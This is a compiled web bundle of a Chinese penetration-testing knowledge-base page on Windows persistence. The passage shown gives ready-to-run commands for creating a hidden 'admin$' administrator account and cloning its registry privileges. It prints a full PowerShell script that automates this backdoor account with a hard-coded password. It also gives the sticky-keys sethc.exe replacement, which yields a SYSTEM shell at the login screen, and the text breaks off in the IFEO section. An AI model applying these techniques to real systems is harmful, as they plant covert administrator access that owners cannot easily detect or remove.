"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[4147],{93:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111103622513-1700304293-101e192c962f088230f566401aa6ac53.png"},2359:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111103304964-1116312506-7cd8a28aca7403d860ad394b4d083d66.png"},3122:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133806575-1829369263-c49293174c42f8ce151688ad1096dba4.png"},3280:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20171003190850302-24534656-a3bedcb3b73060e49deb9925f2a917fd.png"},3570:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111134619162-1282116869-67577acde0d3fb5e1db7b8da4e2fcb51.png"},3800:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210706205538607-a73c434fb7198ffd2c6ec4b6a1e9dbac.png"},6533:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133823263-1377394559-3c086e64232c115cf2b74faffe614cab.png"},8594:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210707142345792-57afdf54a560cd8b7e0e3fba5c3f382c.png"},8741:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111135146932-2098684535-182a73c0ea4b2d11fd17b577cd074704.png"},8749:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/1592231802206110-e2f6f1d184dccaa7b030e62606de5b61.png"},8873:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210714113628636-12b3187a5903fbbf19858a3a5477425e.png"},8966:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111134750241-1284837023-d1771d6dceaf107357cfee1fb720960a.png"},8976:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111103131337-2058768825-4fee71091eb156075b563a3e8c2c2958.png"},9392:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210714113808329-f2b96538609f16b6aec398fe2c06bed5.png"},13611:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-ec4821051ad5a78e83e0a52c8415307f.bin"},15227:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-20210706162809812-7ca8c0186de971e19e392356b980fd79.bin"},16022:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111103158377-1494098900-08dcd3476d9e551db32f2f409e2b1d8a.png"},17175:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210706205925444-e7a5a9ccc61832a5c53c759f9c7734d1.png"},19546:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/1592231803170310-e0ff37c8035b8731d8db4eb870126361.png"},22460:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/1592231805174725-b384b636b901cd21b09f89d1ea8917e6.png"},23050:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105134938861-1302950283-b9a76aeafe9e3ab9dcf29105c4899840.png"},23195:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191107214314870-908960496-d20ff84fc7994bbca09da0d392d6a7cd.png"},24178:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191105134757216-192137544-e9558727d0addb553f1e606e4e49d581.png"},24830:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/640-20210706153758201-1b6f792ba4dc347f55ae283387fbcf98.bin"},25748:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111134702533-1784118205-f8770b0e4225006c1b14e36c10f2e404.png"},26229:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210706205902258-576580e3a3e04b478bd5c7705c1e717e.png"},26493:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111133946939-1698762253-d8f311b3d1f94f26f739447fc4021108.png"},27717:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20210707142120969-eebeb4aec2da6d95d15192f686605860.png"},28296:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/894761-20191111135132616-1441953181-c40dcfc34d4a51d769e36429c2bdea87.png"},28453:(e,n,s)=>{s.d(n,{R:()=>l,x:()=>d});var i=s(96540);const r={},t=i.createContext(r);function l(e){const n=i.useContext(t);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:l(e.components),i.createElement(t.Provider,{value:n},e.children)}},29031:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>d,default:()=>h,frontMatter:()=>l,metadata:()=>i,toc:()=>a});const i=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/\u6743\u9650\u7ef4\u6301/Windows\u6743\u9650\u7ef4\u6301","title":"Windows\u6743\u9650\u7ef4\u6301","description":"\u5f71\u5b50\u8d26\u53f7","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/04.\u6743\u9650\u7ef4\u6301/03.Windows\u6743\u9650\u7ef4\u6301.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/04.\u6743\u9650\u7ef4\u6301","slug":"/\u6e17\u900f\u6d4b\u8bd5/\u6743\u9650\u7ef4\u6301/Windows\u6743\u9650\u7ef4\u6301","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/\u6743\u9650\u7ef4\u6301/Windows\u6743\u9650\u7ef4\u6301","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"d4m1ts","lastUpdatedAt":1749874405000,"sidebarPosition":3,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"Linux\u6743\u9650\u63d0\u5347","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/\u6743\u9650\u7ef4\u6301/Linux\u6743\u9650\u63d0\u5347"},"next":{"title":"Linux\u6743\u9650\u7ef4\u6301","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/\u6743\u9650\u7ef4\u6301/Linux\u6743\u9650\u7ef4\u6301"}}');var r=s(74848),t=s(28453);const l={},d="Windows\u6743\u9650\u7ef4\u6301",c={},a=[{value:"\u5f71\u5b50\u8d26\u53f7",id:"\u5f71\u5b50\u8d26\u53f7",level:2},{value:"1\u3001 \u5bf9\u6ce8\u518c\u8868\u8d4b\u4e88\u6743\u9650",id:"1-\u5bf9\u6ce8\u518c\u8868\u8d4b\u4e88\u6743\u9650",level:3},{value:"2\u3001\u521b\u5efa\u7279\u6b8a\u8d26\u6237",id:"2\u521b\u5efa\u7279\u6b8a\u8d26\u6237",level:3},{value:"3\u3001\u5bfc\u51fa\u6ce8\u518c\u8868",id:"3\u5bfc\u51fa\u6ce8\u518c\u8868",level:3},{value:"4\u3001\u5220\u9664\u7279\u6b8a\u8d26\u6237",id:"4\u5220\u9664\u7279\u6b8a\u8d26\u6237",level:3},{value:"5\u3001\u5bfc\u5165reg\u6587\u4ef6",id:"5\u5bfc\u5165reg\u6587\u4ef6",level:3},{value:"6\u3001\u5927\u529f\u544a\u6210",id:"6\u5927\u529f\u544a\u6210",level:3},{value:"7\u3001\u5220\u9664\u65b9\u6cd5",id:"7\u5220\u9664\u65b9\u6cd5",level:3},{value:"8\u3001\u811a\u672c\u81ea\u52a8\u5316",id:"8\u811a\u672c\u81ea\u52a8\u5316",level:3},{value:"\u8f85\u52a9\u529f\u80fd\u955c\u50cf\u52ab\u6301",id:"\u8f85\u52a9\u529f\u80fd\u955c\u50cf\u52ab\u6301",level:2},{value:"\u4f4e\u7248\u672c",id:"\u4f4e\u7248\u672c",level:3},{value:"\u9ad8\u7248\u672c",id:"\u9ad8\u7248\u672c",level:3},{value:"\u4ec0\u4e48\u662fIFEO",id:"\u4ec0\u4e48\u662fifeo",level:4},{value:"\u53ef\u89c6\u5316\u4fee\u6539",id:"\u53ef\u89c6\u5316\u4fee\u6539",level:4},{value:"\u547d\u4ee4\u884c\u4fee\u6539",id:"\u547d\u4ee4\u884c\u4fee\u6539",level:4},{value:"\u5f00\u673a\u542f\u52a8\u9879",id:"\u5f00\u673a\u542f\u52a8\u9879",level:2},{value:"\u5f00\u59cb\u83dc\u5355\u542f\u52a8\u9879",id:"\u5f00\u59cb\u83dc\u5355\u542f\u52a8\u9879",level:3},{value:"\u7ec4\u7b56\u7565",id:"\u7ec4\u7b56\u7565",level:3},{value:"\u542f\u52a8\u9879\u6ce8\u518c\u8868\u540e\u95e8",id:"\u542f\u52a8\u9879\u6ce8\u518c\u8868\u540e\u95e8",level:3},{value:"\u547d\u4ee4\u884c",id:"\u547d\u4ee4\u884c",level:4},{value:"Metasploit",id:"metasploit",level:4},{value:"SharPersist",id:"sharpersist",level:4},{value:"PoshC2",id:"poshc2",level:4},{value:"Empire",id:"empire",level:4},{value:"\u8ba1\u5212\u4efb\u52a1",id:"\u8ba1\u5212\u4efb\u52a1",level:2},{value:"\u670d\u52a1",id:"\u670d\u52a1",level:2},{value:"\u521b\u5efa\u670d\u52a1",id:"\u521b\u5efa\u670d\u52a1",level:3},{value:"CMD\u76f4\u63a5\u521b\u5efa\u670d\u52a1",id:"cmd\u76f4\u63a5\u521b\u5efa\u670d\u52a1",level:4},{value:"Powershell\u521b\u5efa\u670d\u52a1",id:"powershell\u521b\u5efa\u670d\u52a1",level:4},{value:"\u5176\u4ed6",id:"\u5176\u4ed6",level:4},{value:"\u5176\u4ed6\u7684\u4e00\u4e9b\u5de5\u5177",id:"\u5176\u4ed6\u7684\u4e00\u4e9b\u5de5\u5177",level:4},{value:"SharPersist",id:"sharpersist-1",level:5},{value:"PowerSploit",id:"powersploit",level:5},{value:"PoshC2",id:"poshc2-1",level:5},{value:"Metasploit",id:"metasploit-1",level:5},{value:"telnet\u670d\u52a1",id:"telnet\u670d\u52a1",level:3},{value:"\u5feb\u6377\u65b9\u5f0f",id:"\u5feb\u6377\u65b9\u5f0f",level:2},{value:"\u4ec0\u4e48\u662fLNK",id:"\u4ec0\u4e48\u662flnk",level:3},{value:"\u5229\u7528\u624b\u6cd5",id:"\u5229\u7528\u624b\u6cd5",level:3},{value:"\u5229\u7528\u8fc7\u7a0b",id:"\u5229\u7528\u8fc7\u7a0b",level:3},{value:"\u76f4\u63a5\u4fee\u6539\uff0c\u653e\u7f6e\u542f\u52a8\u76ee\u5f55",id:"\u76f4\u63a5\u4fee\u6539\u653e\u7f6e\u542f\u52a8\u76ee\u5f55",level:4},{value:"\u540c\u65f6\u542f\u52a8\u4e24\u4e2a\u7a0b\u5e8f",id:"\u540c\u65f6\u542f\u52a8\u4e24\u4e2a\u7a0b\u5e8f",level:4},{value:"\u4e00\u4e9b\u8f85\u52a9\u5de5\u5177",id:"\u4e00\u4e9b\u8f85\u52a9\u5de5\u5177",level:3},{value:"Empire",id:"empire-1",level:4},{value:"SharPersist",id:"sharpersist-2",level:4},{value:"PoshC2",id:"poshc2-2",level:4},{value:"DLL\u52ab\u6301",id:"dll\u52ab\u6301",level:2},{value:"\u4ecb\u7ecd",id:"\u4ecb\u7ecd",level:3},{value:"\u65f6\u95f4\u670d\u52a1\u5668",id:"\u65f6\u95f4\u670d\u52a1\u5668",level:3},{value:"\u8865\u5145\u8bf4\u660e",id:"\u8865\u5145\u8bf4\u660e",level:4},{value:"Print Spooler\u7aef\u53e3\u76d1\u89c6\u5668",id:"print-spooler\u7aef\u53e3\u76d1\u89c6\u5668",level:3},{value:"Netsh Helper DLL",id:"netsh-helper-dll",level:3},{value:"COM\u52ab\u6301",id:"com\u52ab\u6301",level:2},{value:"\u4ecb\u7ecd",id:"\u4ecb\u7ecd-1",level:3},{value:"\u6301\u4e45\u5316",id:"\u6301\u4e45\u5316",level:3},{value:"\u8ba1\u5212\u4efb\u52a1",id:"\u8ba1\u5212\u4efb\u52a1-1",level:4},{value:"\u53c2\u8003\u6587\u7ae0",id:"\u53c2\u8003\u6587\u7ae0",level:3},{value:"Winlogon\u7528\u6237\u767b\u5f55\u521d\u59cb\u5316",id:"winlogon\u7528\u6237\u767b\u5f55\u521d\u59cb\u5316",level:2},{value:"Logon Scripts\u540e\u95e8",id:"logon-scripts\u540e\u95e8",level:2},{value:"\u6587\u4ef6\u5173\u8054\uff08\u6253\u5f00\u65b9\u5f0f\uff09",id:"\u6587\u4ef6\u5173\u8054\u6253\u5f00\u65b9\u5f0f",level:2},{value:"Bitsadmin",id:"bitsadmin",level:2},{value:"\u8fdb\u7a0b\u6ce8\u5165",id:"\u8fdb\u7a0b\u6ce8\u5165",level:2},{value:"\u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f",id:"\u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f",level:2},{value:"WMI\u6784\u9020\u65e0\u6587\u4ef6\u540e\u95e8",id:"wmi\u6784\u9020\u65e0\u6587\u4ef6\u540e\u95e8",level:2},{value:"\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u8005",id:"\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u8005",level:2},{value:"Mimikatz",id:"mimikatz",level:3},{value:"\u65b9\u6cd5\u4e00",id:"\u65b9\u6cd5\u4e00",level:4},{value:"\u65b9\u6cd5\u4e8c",id:"\u65b9\u6cd5\u4e8c",level:4},{value:"PowerSploit",id:"powersploit-1",level:3},{value:"Empire",id:"empire-2",level:3},{value:"SharpSploitConsole",id:"sharpsploitconsole",level:3},{value:"\u53c2\u8003\u94fe\u63a5",id:"\u53c2\u8003\u94fe\u63a5",level:2}];function o(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",h5:"h5",header:"header",hr:"hr",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"windows\u6743\u9650\u7ef4\u6301",children:"Windows\u6743\u9650\u7ef4\u6301"})}),"\n",(0,r.jsx)(n.h2,{id:"\u5f71\u5b50\u8d26\u53f7",children:"\u5f71\u5b50\u8d26\u53f7"}),"\n",(0,r.jsx)(n.p,{children:"\u5f71\u5b50\u7528\u6237\u5373\u521b\u5efa\u7684\u9690\u85cf\u7528\u6237\uff0c\u5b83\u65e0\u6cd5\u901a\u8fc7\u666e\u901a\u547d\u4ee4\u8fdb\u884c\u67e5\u8be2\uff0c\u6bd4\u8f83\u9690\u853d\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"1-\u5bf9\u6ce8\u518c\u8868\u8d4b\u4e88\u6743\u9650",children:"1\u3001 \u5bf9\u6ce8\u518c\u8868\u8d4b\u4e88\u6743\u9650"}),"\n",(0,r.jsxs)(n.p,{children:["\u9ed8\u8ba4\u6ce8\u518c\u8868 ",(0,r.jsx)(n.code,{children:"HKEY_LOCAL_MACHINE\\SAM\\SAM\\"})," \u53ea\u6709system\u6743\u9650\u624d\u80fd\u4fee\u6539"]}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u9700\u8981\u4e3a\u5176\u6dfb\u52a0\u7ba1\u7406\u5458\u6743\u9650"}),"\n",(0,r.jsx)(n.p,{children:"\u53f3\u952e-\u6743\u9650-\u9009\u4e2dAdministrators\uff0c\u5141\u8bb8\u5b8c\u5168\u63a7\u5236"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210706205602898",src:s(41866).A+"",width:"532",height:"750"})}),"\n",(0,r.jsx)(n.p,{children:"\u91cd\u542f\u6ce8\u518c\u8868"}),"\n",(0,r.jsx)(n.h3,{id:"2\u521b\u5efa\u7279\u6b8a\u8d26\u6237",children:"2\u3001\u521b\u5efa\u7279\u6b8a\u8d26\u6237"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"net user admin$ Aa123456... /add\nnet localgroup administrators admin$ /add\n"})}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsxs)(n.p,{children:["PS: \u7528 ",(0,r.jsx)(n.strong,{children:"$"})," \u7ed3\u5c3e\u662f\u56e0\u4e3a ",(0,r.jsx)(n.code,{children:"net user"})," \u65e0\u6cd5\u83b7\u53d6\uff0c\u4e00\u5b9a\u60c5\u51b5\u4e0b\u9690\u853d"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"3\u5bfc\u51fa\u6ce8\u518c\u8868",children:"3\u3001\u5bfc\u51fa\u6ce8\u518c\u8868"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u6ce8\u518c\u8868 ",(0,r.jsx)(n.code,{children:"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names"}),"\u4e0b\u627e\u5230\u65b0\u5efa\u7684\u5e10\u6237 ",(0,r.jsx)(n.code,{children:"admin$"})]}),"\n",(0,r.jsx)(n.p,{children:"\u8fd8\u6709\u5982\u56fe\u7684 2 \u4e2a\uff0c\u5747\u5bfc\u51fa"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210706205538607",src:s(3800).A+"",width:"587",height:"575"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f97\u52303\u4e2a\u5bfc\u51fa\u7684\u6ce8\u518c\u8868\uff0c\u5982\u4e0b"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210706205754396",src:s(95187).A+"",width:"97",height:"321"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7f16\u8f91 ",(0,r.jsx)(n.code,{children:"1F4"})," \u548c ",(0,r.jsx)(n.code,{children:"3EE"})," \u7684\u6ce8\u518c\u8868\uff0c\u7528 ",(0,r.jsx)(n.code,{children:"1F4"})," \u91cc\u9762\u7684 ",(0,r.jsx)(n.strong,{children:"F"})," \u53bb\u66ff\u6362 ",(0,r.jsx)(n.code,{children:"3EE"})," \u91cc\u9762\u7684 ",(0,r.jsx)(n.strong,{children:"F"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210706205811834",src:s(32070).A+"",width:"999",height:"390"})}),"\n",(0,r.jsx)(n.p,{children:"\u4fdd\u5b58"}),"\n",(0,r.jsx)(n.h3,{id:"4\u5220\u9664\u7279\u6b8a\u8d26\u6237",children:"4\u3001\u5220\u9664\u7279\u6b8a\u8d26\u6237"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"net user admin$ /del\n"})}),"\n",(0,r.jsx)(n.h3,{id:"5\u5bfc\u5165reg\u6587\u4ef6",children:"5\u3001\u5bfc\u5165reg\u6587\u4ef6"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsxs)(n.p,{children:["\u65b9\u6cd5\u4e00\uff1a\u76f4\u63a5\u53cc\u51fb ",(0,r.jsx)(n.code,{children:"admin$"})," \u548c ",(0,r.jsx)(n.code,{children:"3EE"})," \u6ce8\u518c\u8868"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:"\u65b9\u6cd5\u4e8c\uff1a"}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"regedit /s 3EE.reg\nregedit /s admin$.reg\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210706205840902",src:s(62238).A+"",width:"434",height:"94"})}),"\n",(0,r.jsx)(n.h3,{id:"6\u5927\u529f\u544a\u6210",children:"6\u3001\u5927\u529f\u544a\u6210"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210706205902258",src:s(26229).A+"",width:"427",height:"433"})}),"\n",(0,r.jsxs)(n.p,{children:["\u65e0\u6cd5\u901a\u8fc7 ",(0,r.jsx)(n.code,{children:"net user admin$ /del"})," \u6765\u5220\u9664"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210706205925444",src:s(17175).A+"",width:"448",height:"88"})}),"\n",(0,r.jsx)(n.h3,{id:"7\u5220\u9664\u65b9\u6cd5",children:"7\u3001\u5220\u9664\u65b9\u6cd5"}),"\n",(0,r.jsxs)(n.p,{children:["\u5220\u9664\u6ce8\u518c\u8868 ",(0,r.jsx)(n.code,{children:"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\"})," \u4e0b\u5bf9\u5e94\u5e10\u6237\u7684\u952e\u503c\u5373\u53ef(\u5171\u6709\u4e24\u5904)"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210706205944131",src:s(55671).A+"",width:"452",height:"594"})}),"\n",(0,r.jsx)(n.h3,{id:"8\u811a\u672c\u81ea\u52a8\u5316",children:"8\u3001\u811a\u672c\u81ea\u52a8\u5316"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1",children:"https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1"})}),"\n"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"PS C:>.\\Windows-User-Clone_ps1.ps1"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"powershell -File Windows-User-Clone_ps1.ps1"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'function Create-Clone\n{\n<#\n.SYNOPSIS\nThis script requires System privileges. You can use Invoke-TokenManipulation.ps1 to get System privileges and create the clone user.\nLink: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1\n\nAuthor: Evilcg and 3gstuent\nEvilcg\'s way to achieve the same goal:\nhttps://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1\n\n.PARAMETER u\nThe clone username\n.PARAMETER p\nThe clone user\'s password\n.PARAMETER cu\nThe user to be cloned, default administrator \n.EXAMPLE\nCreate-Clone -u abc -p abc123 -cu administrator\n#>\n     Param(\n        [Parameter(Mandatory=$true)]\n        [String]\n        $u,\n\n        [Parameter(Mandatory=$true)]\n        [String]\n        $p,\n\n        [Parameter(Mandatory=$false)]\n        [String]\n        $cu = "administrator"\n    )\n\n\n    function Create-user ([string]$Username,[string]$Password) \n    {\n        $group = "Administrators"\n        $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"\n        $existing = $adsi.Children | where {$_.SchemaClassName -eq \'user\' -and $_.Name -eq $Username }\n        if ($existing -eq $null) {\n            Write-Host "Creating new local user $Username with password $Password"\n            & NET USER $Username $Password /add /y /expires:never | Out-Null\n            Write-Host "Adding local user $Username to $group."\n            & NET LOCALGROUP $group $Username /add | Out-Null\n        }\n        else {\n            Write-Host "[*] Setting password for existing local user $Username"\n            $existing.SetPassword($Password)           \n        }\n\n        Write-Host "[*] Ensuring password for $Username never expires"\n        WMIC USERACCOUNT WHERE "Name=\'$Username\'" SET PasswordExpires=FALSE\n    }\n\n    function GetUser-Key([string]$user)\n    {\n        cmd /c "regedit /e $env:temp\\$user.reg "HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\$user""\n        $file = Get-Content "$env:temp\\$user.reg"  | Out-String\n        $pattern="@=hex\\((.*?)\\)\\:"\n        $file -match $pattern |Out-Null\n        $key = "00000"+$matches[1]\n        Write-Host $key\n        return $key\n    }\n    \n    function Clone ([string]$ukey,[string]$cukey) \n    {\n        $ureg = "HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\$ukey" |Out-String\n        $cureg = "HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\$cukey" |Out-String       \n        $cuFreg = Get-Item -Path $cureg.Trim()\n        $cuFvalue = $cuFreg.GetValue(\'F\')\n        Set-ItemProperty -path $ureg.Trim()  -Name "F" -value $cuFvalue\n        $outreg = "HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\$ukey"\n        cmd /c "regedit /e $env:temp\\out.reg $outreg.Trim()"\n        Write-Host "Copy from $cu to $u success."\n    }\n\n    function Main () \n    {\n\n        Write-Host "[*] Current token: "  -NoNewline\n        $token=whoami\n        if($token -ne "nt authority\\system")\n        {\n            Write-Host "  " $token\n            Write-Host "[!] Low privileges."\n            Write-Host "[*] Exit."\n            Exit\n        }\n        else \n        {\n            Write-Host $token\n        }\n\n        Write-Host "[*] Create User..."\n        Create-user $u $p\n    \n        Write-Host "[*] Get User $u\'s Key: "  -NoNewline\n        $ukey = GetUser-Key $u |Out-String\n    \n        Write-Host "[*] Get User $cu\'s Key: "  -NoNewline\n        $cukey = GetUser-Key $cu |Out-String\n        \n        Write-Host "[*] Try to clone..."\n        Clone $ukey $cukey\n\n        Write-Host "[*] Delete User:$u"\n        Net User $u /del |Out-Null\n        \n        Write-Host "[*] Import the registry"\n        cmd /c "regedit /s $env:temp\\$u.reg"\n        cmd /c "regedit /s $env:temp\\out.reg"\n        Write-Host "[*] Clearn"\n        Remove-Item $env:temp\\*.reg\n        Write-Output "[*] All Done."\n    }    \n    Main   \n}\nCreate-Clone -u admin$ -p Aa123456...\n\n'})}),"\n",(0,r.jsx)(n.h2,{id:"\u8f85\u52a9\u529f\u80fd\u955c\u50cf\u52ab\u6301",children:"\u8f85\u52a9\u529f\u80fd\u955c\u50cf\u52ab\u6301"}),"\n",(0,r.jsx)(n.p,{children:"\u4e3a\u4e86\u4f7f\u7535\u8111\u66f4\u6613\u4e8e\u4f7f\u7528\u548c\u8bbf\u95ee\uff0cWindows \u6dfb\u52a0\u4e86\u4e00\u4e9b\u8f85\u52a9\u529f\u80fd\u3002\u8fd9\u4e9b\u529f\u80fd\u53ef\u4ee5\u5728\u7528\u6237\u767b\u5f55\u4e4b\u524d\u4ee5\u7ec4\u5408\u952e\u542f\u52a8\u3002\u6839\u636e\u8fd9\u4e2a\u7279\u5f81\uff0c\u4e00\u4e9b\u6076\u610f\u8f6f\u4ef6\u65e0\u9700\u767b\u5f55\u5230\u7cfb\u7edf\uff0c\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u534f\u8bae\u5c31\u53ef\u4ee5\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002"}),"\n",(0,r.jsxs)(n.p,{children:["\u6bd4\u5982",(0,r.jsx)(n.strong,{children:"\u6700\u5e38\u89c1\u7684\u63095\u4e0bshift\u51fa\u73b0\u7684\u7c98\u6ede\u952eSethc.exe\uff08shift\u540e\u95e8\uff09"}),"\uff0c\u8fd8\u6709Windows + U\u7ec4\u5408\u952e\u65f6\u542f\u52a8\u7684utilman.exe\u7a0b\u5e8f"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"\u5c4f\u5e55\u952e\u76d8\uff1aC:\\Windows\\System32\\osk.exe\n\u653e\u5927\u955c\uff1aC:\\Windows\\System32\\Magnify.exe\n\u65c1\u767d\uff1aC:\\Windows\\System32\\Narrator.exe\n\u663e\u793a\u5207\u6362\u5668 C:\\Windows\\System32\\DisplaySwitch.exe\n\u5e94\u7528\u5207\u6362\u5668\uff1aC:\\Windows\\System32\\AtBroker.exe\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u4f4e\u7248\u672c",children:"\u4f4e\u7248\u672c"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u8f83\u65e9\u7684 Windows \u7248\u672c\uff0c\u53ea\u9700\u8981\u8fdb\u884c\u7b80\u5355\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u66ff\u6362\uff0c\u6bd4\u5982\u7ecf\u5178\u7684shift\u540e\u95e8\u662f\u5c06",(0,r.jsx)(n.code,{children:"C:\\Windows\\System32\\sethc.exe"}),"\u66ff\u6362\u4e3a",(0,r.jsx)(n.code,{children:"cmd.exe"}),"\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"cd WINDOWS\\system32\nmove sethc.exe sethc.exe.bak\ncopy cmd.exe sethc.exe\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u76f4\u63a5\u63095\u6b21shift\u952e\u5f39\u51facmd\u7a97\u53e3\uff0c\u53ef\u76f4\u63a5\u4ee5system\u6743\u9650\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u521b\u5efa\u7ba1\u7406\u5458\u7528\u6237\uff0c\u767b\u5f55\u670d\u52a1\u5668\u7b49\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(46290).A+"",width:"783",height:"572"})}),"\n",(0,r.jsx)(n.h3,{id:"\u9ad8\u7248\u672c",children:"\u9ad8\u7248\u672c"}),"\n",(0,r.jsx)(n.p,{children:"\u518d\u8f83\u9ad8\u7684\u7248\u672c\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u7528\u5230IFEO,\u5373\u6620\u50cf\u52ab\u6301\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"\u4ec0\u4e48\u662fifeo",children:"\u4ec0\u4e48\u662fIFEO"}),"\n",(0,r.jsxs)(n.p,{children:["\u6240\u8c13\u7684IFEO\u5c31\u662f",(0,r.jsx)(n.code,{children:"Image File Execution 